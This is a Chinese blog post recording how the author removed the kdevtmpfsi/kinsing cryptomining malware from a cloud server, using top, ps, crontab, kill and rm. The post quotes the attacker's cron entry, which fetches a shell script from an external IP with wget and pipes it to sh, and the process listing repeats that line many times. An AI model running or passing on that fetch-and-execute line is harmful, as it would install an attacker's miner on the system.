---
title: 云服务器清理病毒kdevtmpfsi
author: 王诗翔
date: '2021-09-08'
slug: clean-virus-in-cloud-server
categories:
  - Blog
tags:
  - Linux
description: 清理腾讯云上的病毒程序
---

云服务器一段时间没使用就经常能发现存在挖矿病毒，也不知道怎么进来的。
也不知道各种云服务商干啥去了，一般能本地使用电脑还是不建议使用云服务器。

本文记录下清理病毒的大体流程，防止脑子总是忘记，又不是需要它。

## 查看占CPU任务名

这种一般top就可以了。

```bash
$ top -H

top - 19:47:30 up 72 days,  4:01,  1 user,  load average: 3.46, 3.17, 3.12
Threads: 357 total,   5 running, 352 sleeping,   0 stopped,   0 zombie
%Cpu(s): 98.7 us,  1.3 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem :  1882016 total,    69388 free,   579844 used,  1232784 buff/cache
KiB Swap:  2097148 total,  2002172 free,    94976 used.  1106516 avail Mem 

  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                               
24665 zd        20   0  710928 265496    672 R 98.0 14.1   3088:23 kdevtmpfsi                                                                            
 4332 wsx       20   0  162392   2536   1600 R  0.3  0.1   0:00.02 top                                                                                   
18025 root      20   0  744796  14724   2060 S  0.3  0.8   7:15.89 barad_agent                                                                           
    1 root      20   0   43744   3492   2252 S  0.0  0.2  14:14.25 systemd                                                                               
    2 root      20   0       0      0      0 S  0.0  0.0   0:01.60 kthreadd                                                                              
    4 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker/0:0H                                                                          
    6 root      20   0       0      0      0 S  0.0  0.0   2:20.00 ksoftirqd/0                                                                           
    7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0                                                                           
    8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh                                                                                
    9 root      20   0       0      0      0 R  0.0  0.0  11:28.07 rcu_sched                                                                             
   10 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 lru-add-drain                                                                         
   11 root      rt   0       0      0      0 S  0.0  0.0   0:21.41 watchdog/0                                                                            
   13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs                                                                             
   14 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns                                                                                 
   15 root      20   0       0      0      0 S  0.0  0.0   0:01.40 khungtaskd                                                                            
   16 root       0 -20       0      0      0 S  0.0  0.0   0:00.03 writeback                                                                             
   17 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kintegrityd                                                                           
   18 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                                                                
   19 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                                                                
   20 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                                                                
   21 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kblockd                                                                               
   22 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 md                                                                                    
   23 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 edac-poller                                                                           
   24 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 watchdogd                                                                             
   30 root      20   0       0      0      0 S  0.0  0.0   0:26.73 kswapd0                                                                               
   31 root      25   5       0      0      0 S  0.0  0.0   0:00.00 ksmd                                                                                  
   32 root      39  19       0      0      0 S  0.0  0.0   0:07.05 khugepaged                                                                            
   33 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 crypto      
```

## 查看相应的病毒文件

一般病毒都都有守护进程，你杀掉会重新启动，必须删除文件的同时，去掉可能存在的定时
任务。

```bash
[wsx@VM-0-5-centos ~]$ ps -ef | grep kinsing
wsx       4572  2594  0 19:48 pts/0    00:00:00 grep --color=auto kinsing
zd       23244     1  0 8月01 ?       00:03:42 /tmp/kinsing
[wsx@VM-0-5-centos ~]$ ps -ef | grep kdevtmpfsi
wsx       4574  2594  0 19:49 pts/0    00:00:00 grep --color=auto kdevtmpfsi
zd       25128     1 97 8月01 ?       37-09:55:38 /tmp/kdevtmpfsi
```

查看指定用户的定时任务：

```bash
$ sudo crontab -e -u zd
* * * * * wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
```

我们可以看到有个定时任务，就是一个sh脚本。

## 清除

把这个定时任务删除，同时杀掉上面的进程。

```bash
[wsx@VM-0-5-centos ~]$ sudo kill -9 25128
[wsx@VM-0-5-centos ~]$ sudo kill -9 23244
[wsx@VM-0-5-centos ~]$ sudo rm /tmp/kinsing
[wsx@VM-0-5-centos ~]$ sudo rm /tmp/kdevtmpfsi 
```

查看top，看有什么遗漏没有。发现还有大量未知的shell运行，进行批量删除：

```bash
[zd@VM-0-5-centos spool]$ ps -ef | grep 'http://195'
zd         729   726  0 19:25 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd         731   729  0 19:25 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd         890   889  0 19:26 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd         893   890  0 19:26 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        1052  1051  0 19:27 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        1054  1052  0 19:27 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        1216  1214  0 19:28 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        1218  1216  0 19:28 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        1367  1366  0 19:29 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        1370  1367  0 19:29 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        1528  1523  0 19:30 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        1531  1528  0 19:30 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        1689  1688  0 19:31 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        1692  1689  0 19:31 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        1843  1842  0 19:32 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        1845  1843  0 19:32 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        2001  2000  0 19:33 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        2004  2001  0 19:33 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        2158  2156  0 19:34 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        2159  2158  0 19:34 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        2320  2318  0 19:35 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        2324  2320  0 19:35 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        2469  2468  0 19:36 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        2472  2469  0 19:36 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        2686  2685  0 19:37 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        2688  2686  0 19:37 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        2830  2829  0 19:38 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        2832  2830  0 19:38 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        2992  2991  0 19:39 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        2994  2992  0 19:39 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        3151  3148  0 19:40 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        3154  3151  0 19:40 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        3302  3301  0 19:41 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        3304  3302  0 19:41 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        3473  3472  0 19:42 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        3475  3473  0 19:42 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        3631  3629  0 19:43 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        3633  3631  0 19:43 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        3785  3784  0 19:44 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        3787  3785  0 19:44 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        3948  3947  0 19:45 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        3950  3948  0 19:45 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        4107  4105  0 19:46 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        4109  4107  0 19:46 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        4263  4262  0 19:47 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        4265  4263  0 19:47 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        4427  4426  0 19:48 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        4430  4427  0 19:48 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        4577  4576  0 19:49 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        4579  4577  0 19:49 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        4737  4736  0 19:50 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        4740  4737  0 19:50 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        4896  4894  0 19:51 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/h2.sh | sh > /dev/null 2>&1
zd        4899  4896  0 19:51 ?        00:00:00 wget -q -O - http://195.3.146.118/h2.sh
zd        7879  7445  0 20:09 pts/0    00:00:00 grep --color=auto http://195
```

```bash
[zd@VM-0-5-centos spool]$ ps -ef | grep 'http://195' | grep -v grep | awk '{print $2}' | xargs kill -9
```

## 其他

还可以检查是否有可疑的启动项，公钥等。


> 参考：<https://blog.csdn.net/lingeio/article/details/103968393>
